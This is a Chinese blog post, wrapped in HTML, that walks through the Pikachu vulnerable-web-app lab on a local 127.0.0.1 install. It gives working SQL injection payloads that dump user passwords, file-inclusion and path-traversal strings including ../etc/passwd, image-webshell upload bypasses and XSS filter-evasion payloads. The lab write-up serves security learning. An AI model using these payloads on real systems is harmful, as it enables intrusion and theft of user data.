@@ -1,0 +1,241 @@
+<!DOCTYPE html><html lang="en" theme-mode="light"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Pikachu打靶随记 | Vincent</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":"all","activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Brands';
+ src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Free';
+ src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://cdnjson.com/images/2023/05/14/bg.jpg');
+  --light-background: url('https://cdnjson.com/images/2023/05/14/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>Pikachu打靶随记</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-06-18T07:06:21.000Z" id="date"> 2023-06-18</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-06-30T08:29:52.927Z" id="updated"> 2023-06-30</time></div></span></div></div><hr><div id="post-content"><p>这篇文章的靶场是Pikachu</p>
+<span id="more"></span>
+
+<h1 id="Sql注入"><a href="#Sql注入" class="headerlink" title="Sql注入"></a>Sql注入</h1><h2 id="第一关-数字型注入（Post）"><a href="#第一关-数字型注入（Post）" class="headerlink" title="第一关 数字型注入（Post）"></a>第一关 数字型注入（Post）</h2><p>Burpsuite抓包然后修改参数注入即可</p>
+<h2 id="第二关-字符型注入（Get）"><a href="#第二关-字符型注入（Get）" class="headerlink" title="第二关 字符型注入（Get）"></a>第二关 字符型注入（Get）</h2><p>同样修改参数name进行注入即可</p>
+<h2 id="第三关-搜索型注入"><a href="#第三关-搜索型注入" class="headerlink" title="第三关 搜索型注入"></a>第三关 搜索型注入</h2><p>这一关需要好好记录一下，遇到了一种新的注入，</p>
+<p>之前我们判断闭合的方式是单引号或双引号+n个括号，</p>
+<p>但是在这里你就会发现，他是单引号闭合加上的不是括号，</p>
+<p>导致你怎么也试不出来，无奈之下看了一下别人的writeup：</p>
+
+
+<p>Like语句我之前sql注入学习笔记#17介绍过了</p>
+<p>也就是说，如果要闭合，应该是  “  %’  ”</p>
+<p>那么之后的就一样了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?name=1%&#x27;) order by 2--+&amp;submit=%E6%9F%A5%E8%AF%A2   获取字段数<br><br>1%&#x27;) union select 1,2--+&amp;submit=%E6%9F%A5%E8%AF%A2   注出回显点<br><br>?name=1%&#x27;) union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()--+&amp;submit=%E6%9F%A5%E8%AF%A2 获取数据库中的表格<br><br>?name=1%&#x27;) union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;--+&amp;submit=%E6%9F%A5%E8%AF%A2  获取表格中的列名<br><br>?name=1%&#x27;) union select 1,group_concat(id,username,password,level) from users--+&amp;submit=%E6%9F%A5%E8%AF%A2  获取列名下的数据<br></code></pre></td></tr></table></figure>
+
+<h2 id="第四关-xx型注入"><a href="#第四关-xx型注入" class="headerlink" title="第四关 xx型注入"></a>第四关 xx型注入</h2><p>这一关估计是不想告诉我们这是什么注入吧。。。</p>
+<p>但是他似乎和上面的字符型注入同理，只不过是闭合是单引号+括号</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">name=&#x27;) union select 1,2 --+&amp;submit=%E6%9F%A5%E8%AF%A2<br></code></pre></td></tr></table></figure>
+
+<p>剩下的就都一样了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?name=1&#x27;) union select 1,group_concat(id,username,password,level) from users--+&amp;submit=%E6%9F%A5%E8%AF%A2   最后一步获取全部数据<br></code></pre></td></tr></table></figure>
+
+<h2 id="第五关-insert、update注入"><a href="#第五关-insert、update注入" class="headerlink" title="第五关 insert、update注入"></a>第五关 insert、update注入</h2><p>这个注入之前也已经在学习笔记里面讲过了，</p>
+<p>应该是在http头下注入的那一篇，简单讲一下原理</p>
+<hr>
+<p>原来的语句是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">insert into users (id,username,password,level) values (&#x27;4&#x27;,&#x27;$username&#x27;,&#x27;114514&#x27;,&#x27;1&#x27;);<br></code></pre></td></tr></table></figure>
+
+<p>然后构造我们的payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#x27; or extractvalue(1,concat(0x7e,(database()))),2,3,4)#<br></code></pre></td></tr></table></figure>
+
+<p>此时，原来的语句就变成了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">insert into users (id,username,password,level) values (&#x27;4&#x27;,&#x27;&#x27; or extractvalue(1,concat(0x7e,(database()))),2,3,4)#&#x27;,&#x27;114514&#x27;,&#x27;1&#x27;);<br></code></pre></td></tr></table></figure>
+
+<p>去掉注释后面的内容，可以理解为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">insert into users (id,username,password,level) values (&#x27;4&#x27;,&#x27;&#x27; or extractvalue(1,concat(0x7e,(database()))),2,3,4)<br></code></pre></td></tr></table></figure>
+
+<hr>
+<p>现在理论讲完了，实操一下吧，</p>
+<p>首先来到pikachu的insert、update注入靶场，点击下面的注册，</p>
+<p>因为只有注册才会涉及到insert函数，</p>
+<p>然后可以看到一共有6行，因此要构造6个参数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#x27; or extractvalue(1,concat(0x7e,(database()))),2,3,4,5,6)#<br></code></pre></td></tr></table></figure>
+
+<p>于是，我们便可以得到回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">XPATH syntax error: &#x27;~pikachu&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>接下来的语句，就是在上面的payload的0x7e后面修改注入语句了</p>
+<h2 id="第六关-delete注入"><a href="#第六关-delete注入" class="headerlink" title="第六关 delete注入"></a>第六关 delete注入</h2><p>是一个留言板，留言之后会出现一个“删除”按钮，</p>
+<p>那注入点不就来了吗👍burp抓一下包</p>
+
+
+<p>出现了id字样，开始构造payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">57+or+updatexml(1,concat(0x7e,database()),1)<br></code></pre></td></tr></table></figure>
+
+<p>这里我遇到了一个问题，为什么写空格不行要写“+”号？</p>
+<p>并且在本地MySQL测试中，空格是可以的，但是加号会报错</p>
+
+
+<hr>
+<p>思考了一下，觉得应该是程序会过滤空格，url会自动把加号转义为空格</p>
+<h2 id="第七关-http头注入"><a href="#第七关-http头注入" class="headerlink" title="第七关 http头注入"></a>第七关 http头注入</h2><p>这个之前也讲过了，这里就简单看看，</p>
+<p>原理和上面的insert注入原理相同</p>
+<hr>
+<p>这个靶场是一个登陆界面，首先想到的是万能密码，</p>
+<p>失败了，然后就是尝试http头注入了，</p>
+<p>但是我们首先需要获取账号和密码才可以进行注入，</p>
+<p>点开右上角提示就有了</p>
+<hr>
+<p>然后就可以开始注入了，这里有4个地方可以注入：</p>
+
+
+<p>我这里就选择ua注入了</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#x27; or extractvalue(1,concat(0x7e,(database()))) or &#x27; #<br></code></pre></td></tr></table></figure>
+
+<p>这个新的payload与之前不同的是，它不需要知道一共有几个参数，</p>
+<p>代入到语句之后，是这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">insert into users (id,username,password,level) values (&#x27;4&#x27;,&#x27;&#x27; or extractvalue(1,concat(0x7e,(database()))) or &#x27;&#x27;,&#x27;114514&#x27;,&#x27;1&#x27;);<br></code></pre></td></tr></table></figure>
+
+<p>同样可以执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">mysql&gt; insert into users (id,username,password,level) values (&#x27;4&#x27;,&#x27;&#x27; or extractvalue(1,concat(0x7e,(database()))) or &#x27;&#x27;,&#x27;114514&#x27;,&#x27;1&#x27;);<br>ERROR 1105 (HY000): XPATH syntax error: &#x27;~pikachu&#x27;<br></code></pre></td></tr></table></figure>
+
+<h2 id="第八-九关-盲注"><a href="#第八-九关-盲注" class="headerlink" title="第八,九关 盲注"></a>第八,九关 盲注</h2><p>盲注这个算了吧懒得搞了</p>
+<h2 id="第十关-宽字节注入"><a href="#第十关-宽字节注入" class="headerlink" title="第十关 宽字节注入"></a>第十关 宽字节注入</h2><p>payload同前面的字符型注入，</p>
+<p>在每个payload的最前面添加一个%df即可</p>
+<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><h2 id="LFI-Local-File-Include"><a href="#LFI-Local-File-Include" class="headerlink" title="LFI(Local File Include)"></a>LFI(Local File Include)</h2><p>带你开第一关，随便选择一个篮球巨星，url如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=file1.php&amp;submit=提交查询<br></code></pre></td></tr></table></figure>
+
+<p>这不就是妥妥的文件包含漏洞吗？！</p>
+<p>把shell.php放到根目录然后，构造语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?filename=../../../shell.php&amp;submit=提交查询<br></code></pre></td></tr></table></figure>
+
+<p>这里向前了3个目录，为什么呢？根目录不是在两个目录前吗？</p>
+<p>仔细看一下向前两个目录的报错信息：</p>
+
+
+<p>文件的代码是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">include/$filename<br></code></pre></td></tr></table></figure>
+
+<p>注意那个“ &#x2F; ”，代表他向前了一个目录，因此我们要向后一个目录抵消！</p>
+<h2 id="RFI-Remote-File-Include"><a href="#RFI-Remote-File-Include" class="headerlink" title="RFI(Remote File Include)"></a>RFI(Remote File Include)</h2><p>远程文件包含一样很简单，只需要把本地文件目录换成远程url即可</p>
+<p>这里用python开启一个web服务测试一下</p>
+
+
+<p>成功，我们可以利用文件包含的特性来执行非php格式的webshell</p>
+
+
+<h1 id="文件下载漏洞"><a href="#文件下载漏洞" class="headerlink" title="文件下载漏洞"></a>文件下载漏洞</h1><p>认识一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">不安全的文件下载概述：<br>    文件下载功能在很多web系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后 会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。 如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。<br>    此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如../../../etc/passwd),则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等)被下载。 <br>    所以，在设计文件下载功能时，如果下载的目标文件是由前端传进来的，则一定要对传进来的文件进行安全考虑。 切记：所有与前端交互的数据都是不安全的，不能掉以轻心！ <br>    你可以通过“Unsafe file download”对应的测试栏目，来进一步的了解该漏洞。 <br></code></pre></td></tr></table></figure>
+
+<p>我的理解是burp抓包修改需要下载的文件的路径然后下载本无法下载的文件</p>
+<p>试一下</p>
+
+
+<p>ok！</p>
+<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><h2 id="Client-Check"><a href="#Client-Check" class="headerlink" title="Client Check"></a>Client Check</h2><p>“前端的验证就是纸老虎，只需要burpsuite便可轻松捅破”</p>
+<p>​																						————中国哲人Vincent</p>
+<hr>
+<p>bp抓包改后缀，，，成功上传，结束</p>
+<h2 id="Mime-Type"><a href="#Mime-Type" class="headerlink" title="Mime Type"></a>Mime Type</h2><p>“Mime Type验证就是纸老虎，只需要GIF89a以及Content-type: image&#x2F;gif便可轻松捅破”</p>
+<p>​                                                                                       ————中国哲人Vincent</p>
+<hr>
+<p>就是在webshell前面加个GIF89a然后同上面的操作即可</p>
+<p>wc翻车了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">上传的图片只能是jpg,jpeg,png格式的！<br></code></pre></td></tr></table></figure>
+
+<p>不让我上传gif的，没事问题不大，绕过方式一样</p>
+
+
+<h2 id="Get-Image-Size"><a href="#Get-Image-Size" class="headerlink" title="Get Image Size"></a>Get Image Size</h2><p>看一下源代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$html</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$type</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;jpeg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>);<span class="hljs-comment">//指定类型</span><br>    <span class="hljs-variable">$mime</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;image/jpg&#x27;</span>,<span class="hljs-string">&#x27;image/jpeg&#x27;</span>,<span class="hljs-string">&#x27;image/png&#x27;</span>);<br>    <span class="hljs-variable">$save_path</span>=<span class="hljs-string">&#x27;uploads&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;/Y/m/d/&#x27;</span>);<span class="hljs-comment">//根据当天日期生成一个文件夹</span><br>    <span class="hljs-variable">$upload</span>=<span class="hljs-title function_ invoke__">upload</span>(<span class="hljs-string">&#x27;uploadfile&#x27;</span>,<span class="hljs-string">&#x27;512000&#x27;</span>,<span class="hljs-variable">$type</span>,<span class="hljs-variable">$mime</span>,<span class="hljs-variable">$save_path</span>);<span class="hljs-comment">//调用函数</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$upload</span>[<span class="hljs-string">&#x27;return&#x27;</span>])&#123;<br>        <span class="hljs-variable">$html</span>.=<span class="hljs-string">&quot;&lt;p class=&#x27;notice&#x27;&gt;文件上传成功&lt;/p&gt;&lt;p class=&#x27;notice&#x27;&gt;文件保存的路径为：<span class="hljs-subst">&#123;$upload[&#x27;save_path&#x27;]&#125;</span>&lt;/p&gt;&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$html</span>.=<span class="hljs-string">&quot;&lt;p class=notice&gt;<span class="hljs-subst">&#123;$upload[&#x27;error&#x27;]&#125;</span>&lt;/p&gt;&quot;</span>;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这就是上传之后新建几个文件夹存放照片嘛。。。</p>
+<p>直接上传刚才的图片马然后bp改后缀然后F12看响应就可以知道路径了</p>
+<h1 id="XSS跨站攻击"><a href="#XSS跨站攻击" class="headerlink" title="XSS跨站攻击"></a>XSS跨站攻击</h1><h2 id="反射性xss（get）"><a href="#反射性xss（get）" class="headerlink" title="反射性xss（get）"></a>反射性xss（get）</h2><p>不看题直接构造payload：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>成功通关（注意前端修改输入长度）</p>
+<h2 id="反射性xss（post）"><a href="#反射性xss（post）" class="headerlink" title="反射性xss（post）"></a>反射性xss（post）</h2><p>这一关已经将登陆密码放在了提示里面，我们要注入的不是这个登录页面，而是登陆后的东西</p>
+<p>我们直接在登录框输入payload：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>就通关了，他和上面唯一的区别就是没有前端长度限制，不用自己修改了。。。。</p>
+<h2 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h2><p>（上面一题是存储型，在《存储型,Dom型Xss注入学习笔记》这篇文中已经及路过了因此跳过）</p>
+<hr>
+<p>一开始看不懂题啥意思，然后看了一下页面源码：</p>
+
+
+<p>就是a href注入啊，那直接构造payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">javascript:alert()<br></code></pre></td></tr></table></figure>
+
+<p>成功通关</p>
+<h2 id="DOM型xss-x"><a href="#DOM型xss-x" class="headerlink" title="DOM型xss-x"></a>DOM型xss-x</h2><p>这一关有点意思，让你输入一个东西，然后出现一个超链接，点开超链接还有一个超链接，那个超链接指向的最后一级路径就是你输入的那个东西。。。。没搞懂这怎么利用</p>
+<p>但是f12仔细又看了一下还是发现了注入点</p>
+
+
+<p>构造payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+<h2 id="XSS盲打"><a href="#XSS盲打" class="headerlink" title="XSS盲打"></a>XSS盲打</h2><p>首先在留言框输入payload：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>发现没有反应，查看一下提示让我们登录后台，并且给了密码，登录进去发现出现了弹窗，通关</p>
+<p>其实这一关的原理就是存储型xss，输入的时候不会有反应，但是在后台会显示出来，造成了xss注入</p>
+<p>因此存储型xss的主要场景就是那种在线编辑器和评论系统一类的</p>
+<h2 id="XSS过滤"><a href="#XSS过滤" class="headerlink" title="XSS过滤"></a>XSS过滤</h2><p>这一关终于过滤了，输出我们的payload之后只剩下了一个尖括号，尝试换一个语句，前面dvwa用的是img src这里就用a href语句吧</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>发现也被过滤了，可能是后端吧javascript的script过滤了，只能使用img src了</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">114514</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>成功通关</p>
+<h2 id="XSS-Htmlspecialchars过滤"><a href="#XSS-Htmlspecialchars过滤" class="headerlink" title="XSS Htmlspecialchars过滤"></a>XSS Htmlspecialchars过滤</h2><p>这个绕过方式就是通过事件来绕过，我们随便输入一点东西来看看页面源代码</p>
+<p>欸等等。。。这似乎是href注入啊？？</p>
+
+
+<p>看了一下源码</p>
+
+
+<p>确实有过滤，那我们就按照他的来，构造onfocus事件来绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#x27; onfocus=javascript:alert() &#x27;<br></code></pre></td></tr></table></figure>
+
+<p>成功</p>
+<h2 id="XSS-href输出"><a href="#XSS-href输出" class="headerlink" title="XSS href输出"></a>XSS href输出</h2><p>和上面一关的payload其实可以用一样的：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">javascript:alert()<br></code></pre></td></tr></table></figure>
+
+<h2 id="XSS-js输出"><a href="#XSS-js输出" class="headerlink" title="XSS js输出"></a>XSS js输出</h2><p>查看页面源代码：</p>
+
+
+<p>这里只需要闭合一下就可以了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#x27;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<p>带入原来的源代码看一看：</p>
+
+
+<p>后面的那个<code>&lt;/script&gt;</code>出现了语法错误，但是这无伤大雅，并不影响运行！</p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/06/19/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-18/">← Next Sql注入学习笔记#18</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/06/17/%E5%A2%A8%E5%AE%A2%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E9%9A%8F%E8%AE%B0/">墨客靶场打靶随记 Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="valine-sel"></button></div><div id="valine"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="./img/logo.jpg" alt="Logo"></a><h1 id="Dr"><a href="/">Vincent</a></h1><div id="description"><p>不与无谓人争气</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">Sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%85%B3-%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%88Post%EF%BC%89"><span class="toc-number">1.1.</span> <span class="toc-text">第一关 数字型注入（Post）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%85%B3-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%88Get%EF%BC%89"><span class="toc-number">1.2.</span> <span class="toc-text">第二关 字符型注入（Get）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%85%B3-%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.</span> <span class="toc-text">第三关 搜索型注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E5%85%B3-xx%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.</span> <span class="toc-text">第四关 xx型注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E5%85%B3-insert%E3%80%81update%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.</span> <span class="toc-text">第五关 insert、update注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E5%85%B3-delete%E6%B3%A8%E5%85%A5"><span class="toc-number">1.6.</span> <span class="toc-text">第六关 delete注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%83%E5%85%B3-http%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="toc-number">1.7.</span> <span class="toc-text">第七关 http头注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%85%AB-%E4%B9%9D%E5%85%B3-%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.8.</span> <span class="toc-text">第八,九关 盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E5%85%B3-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">1.9.</span> <span class="toc-text">第十关 宽字节注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">文件包含漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#LFI-Local-File-Include"><span class="toc-number">2.1.</span> <span class="toc-text">LFI(Local File Include)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RFI-Remote-File-Include"><span class="toc-number">2.2.</span> <span class="toc-text">RFI(Remote File Include)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">文件下载漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">文件上传漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Client-Check"><span class="toc-number">4.1.</span> <span class="toc-text">Client Check</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mime-Type"><span class="toc-number">4.2.</span> <span 